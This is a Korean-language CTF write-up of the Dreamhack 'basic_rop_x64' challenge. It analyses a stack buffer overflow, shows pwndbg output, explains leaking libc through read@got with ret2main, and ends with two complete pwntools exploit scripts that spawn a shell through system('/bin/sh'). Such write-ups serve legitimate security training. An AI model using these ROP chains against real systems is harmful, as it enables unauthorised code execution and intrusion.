# [Dreamhack]_Basic_ROP_x64

---

## 분석 및 설계

### 분석

### 보호기법

- `checksec` 을 사용하여 적용된 보호기법 파악
    - 실습 환경에는 `ASLR` 이 적용되어 있고, 바이너리에는 `NX` 가 적용됨(`Canary`, `PIE` 는 적용되지 않음)
    - `PIE` 가 적용되지 않기 때문에 해당 바이너리가 실행되는 메모리 주소가 랜덤화되지 않음

```bash
[*] '/home/ubuntu/code/NX_ASLR/Basic_rop_x64/basic_rop_x64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### 코드 분석

- `buf` 변수의 크기는 `0x40` 하지만 `read()` 함수에서 `buf` 변수에 `0x400` 크기의 입력을 받고 있음 → 버퍼 오버플로우가 발생
    - `NX` 보호 기법이 걸려 있기 때문에 셸코드 사용이 어렵고, `Return-oriented programming` 기법을 이용해서 익스플로잇을 진행

```bash
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}

```

## 익스플로잇

- ROP를 사용하여 `system("/bin/sh")` 를 실행하는 것을 목표로 진행
- `buf` 가 할당된 64바이트 뒤에는 8바이트의 `SFP` 와 8바이트의 `RET` 이 위치
- 그래서 더미값으로 72바이트 만큼 입력해서 `buf, SFP` 를 덮고 `RET` 를 원하는 값으로 설정하면 바이너리의 실행 흐름을 조작할 수 있을 것 같음

### 디버깅

```bash
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004007ba <+0>:     push   rbp
   0x00000000004007bb <+1>:     mov    rbp,rsp
   0x00000000004007be <+4>:     sub    rsp,0x50
   0x00000000004007c2 <+8>:     mov    DWORD PTR [rbp-0x44],edi
   0x00000000004007c5 <+11>:    mov    QWORD PTR [rbp-0x50],rsi
   0x00000000004007c9 <+15>:    lea    rdx,[rbp-0x40]
   0x00000000004007cd <+19>:    mov    eax,0x0
   0x00000000004007d2 <+24>:    mov    ecx,0x8
   0x00000000004007d7 <+29>:    mov    rdi,rdx
   0x00000000004007da <+32>:    rep stos QWORD PTR es:[rdi],rax
   0x00000000004007dd <+35>:    mov    eax,0x0
   0x00000000004007e2 <+40>:    call   0x40075e <initialize>
   0x00000000004007e7 <+45>:    lea    rax,[rbp-0x40]
   0x00000000004007eb <+49>:    mov    edx,0x400
   0x00000000004007f0 <+54>:    mov    rsi,rax
   0x00000000004007f3 <+57>:    mov    edi,0x0
   0x00000000004007f8 <+62>:    call   0x4005f0 <read@plt>
   0x00000000004007fd <+67>:    lea    rax,[rbp-0x40]
   0x0000000000400801 <+71>:    mov    edx,0x40
   0x0000000000400806 <+76>:    mov    rsi,rax
   0x0000000000400809 <+79>:    mov    edi,0x1
   0x000000000040080e <+84>:    call   0x4005d0 <write@plt>
   0x0000000000400813 <+89>:    mov    eax,0x0
   0x0000000000400818 <+94>:    leave
   0x0000000000400819 <+95>:    ret
End of assembler dump.
```

- `read, write`  함수에 인자로 들어가는 `buf` 의 주소는 `rbp - 0x40` 임을 확인
- 따라서 `buf + 0x40` 이 `SFP` 이고, `buf + 0x48` 이 익스플로잇 시 값을 조작하여야 하는 `RET` 의 부분임
- 확인

```bash
─────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7ffff7e99887 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x40
 RDI  0x1
 RSI  0x7fffffffc850 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb\n'
 R8   0x7fffffffc780 ◂— 0x0
 R9   0x0
 R10  0x7ffff7d8c128 ◂— 0xf002200005372 /* 'rS' */
 R11  0x246
 R12  0x7fffffffc9a8 —▸ 0x7fffffffce4e ◂— '/home/jerry/rop/basic_rop_x64'
 R13  0x4007ba (main) ◂— push rbp
 R14  0x0
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
 RBP  0x6161616161616161 ('aaaaaaaa')
 RSP  0x7fffffffc898 ◂— 'bbbbbbbb\n'
 RIP  0x400819 (main+95) ◂— ret
──────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────
   0x7ffff7e99887 <write+23>    cmp    rax, -0x1000
   0x7ffff7e9988d <write+29>    ja     write+112                <write+112>

   0x7ffff7e9988f <write+31>    ret
    ↓
   0x400813       <main+89>     mov    eax, 0
   0x400818       <main+94>     leave
 ► 0x400819       <main+95>     ret    <0x6262626262626262>
```

- `"a" * 72 + "b" * 8` 의 입력을 주니 `0x6262626262626262`(`"bbbbbbbb"`)로 리턴하는 것을 확인할 수 있음

### `system` 함수 주소 계산

- `ASLR` 이 걸려있기 때문에, `system` 함수의 주소는 계속 변하게 되지만 ASLR로 인해 변경되는 주소는 라이브러리가 매핑된 BASE 주소이고, 이에 따라 라이브러리 내부 함수들의 offset값은 변경되지 않음
- 그래서 Base 주소를 구하면 `Base주소 + system함수의 offset` 을 통해 `system` 함수의 주소를 구할 수 있음
- 그래서 `read 함수의 주소 - read 함수의 offset` 을 하면 Base 주소를 구할 수 있음
- `read` 함수가 실행 된 이후 `read` 함수의 주소는 GOT에 등록되어 있기 때문에, `read` 함수의 GOT 값을 읽으면 `read` 함수의 주소를 구할 수 있음

### `"/bin/sh"` 문자열

- `"/bin/sh"` 문자열의 주소 또한 `libc.so.6` 라이브러리에 존재함
- `system` 함수와 동일하게 `Base 주소 + "/bin/sh" 문자열 offset` 으로 주소를 구해야함
    - `“/bin/sh”` 문자열의 offset은 아래 코드를 통해 구할 수 있음
    - pwntools의 ELF를 사용하여 libc를 불러온 후, libc에서 search 메서드 함수를 사용
    
    ```bash
    from pwn import *
    
    libc = ELF("./libc.so.6", checksec=False)
    sh = list(libc.search(b"/bin/sh"))[0]
    ```
    

### 시나리오

- 라이브러리의 Base 주소를 모르기 때문에 바로 `system("/bin/sh")` 를 실행하기 어려움
- 따라서 `ret2main` 기법을 사용
    - `ret2main` 기법은 원하는 정보를 얻은 후, 다시 `main` 함수로 돌아와 원하는 명령을 계속 이어나가는 기법
- 먼저 `write` 함수를 이용해 라이브러리의 Base주소 `libc base` 를 구한 후, 그를 이용해 `system` 함수와 `"/bin/sh"` 주소를 계산한 후, 두 번째 `main` 함수 실행 시 `system("/bin/sh")` 를 실행하여 문제를 해결

### libc base 구하기

- `write(1, read@got, 8)`
    - `read@got` 값을 출력하여 `read` 함수 주소 획득
- `libc base = read address - read offset`
    - `read` 함수의 주소에서 offset을 빼서 `libc base` 구하기

### system 함수 주소 구하기

- `system = libc base + system offset`

### “/bin/sh” 주소 구하기

- `"/bin/sh" = libc base + "/bin/sh" offset`

### ret2main

- `write(1, read@got, 8)` 의 코드 이후 `main` 의 주소를 넣어서 `RET` 를 조작하면 `main` 함수로 돌아올 수 있음

### 셸 획득

- `system` 함수의 주소와 `"/bin/sh"` 문자열의 주소를 구했기 때문에, `pop rdi; ret` 가젯을 이용하면 `system("/bin/sh")` 를 호출하여 셸을 획득할 수 있음

## 익스플로잇 코드

- 수업 설명 `exploit.py`

```python
from pwn import *

def slog(symbol, addr):
    return success(symbol + ": " + hex(addr))

#context.log_level = 'debug'

p = remote('host3.dreamhack.games', 10263)
#p = process("./basic_rop_x64")
e = ELF("./basic_rop_x64")
#libc = e.libc
libc = ELF("./libc.so.6", checksec=False)
r = ROP(e)

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh = list(libc.search(b"/bin/sh"))[0]

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# Stage 1
payload:bytes = b'A' * 0x48

# write(1, read@got, 8)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)

# return to main
payload += p64(main)

p.send(payload)

p.recvuntil(b'A' * 0x40)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset
binsh = sh + lb

slog("read", read)
slog("libc base", lb)
slog("system", system)
slog("/bin/sh", binsh)

# Stage 2
payload: bytes = b'A' * 0x48

# system("/bin/sh")
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()
```

- 내가 작성한 `exploit.py`

```python
from pwn import *

p = process('./basic_rop_x64', env = {"LD_PRELOAD" : "./libc.so.6"})

e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6', checksec=False)

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
main = e.symbols["main"]

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']
sh = list(libc.search(b"/bin/sh"))[0]

pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881

payload = b'A' * 0x40 + b'B' * 0x8
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(5)
payload += p64(write_plt)

payload += p64(main)

p.send(payload)

p.recvuntil(b'A' * 0x40)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset
binsh = sh + lb

payload = b'A' * 0x48
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
# p.recvuntil(b'A' * 0x40)

p.interactive()
```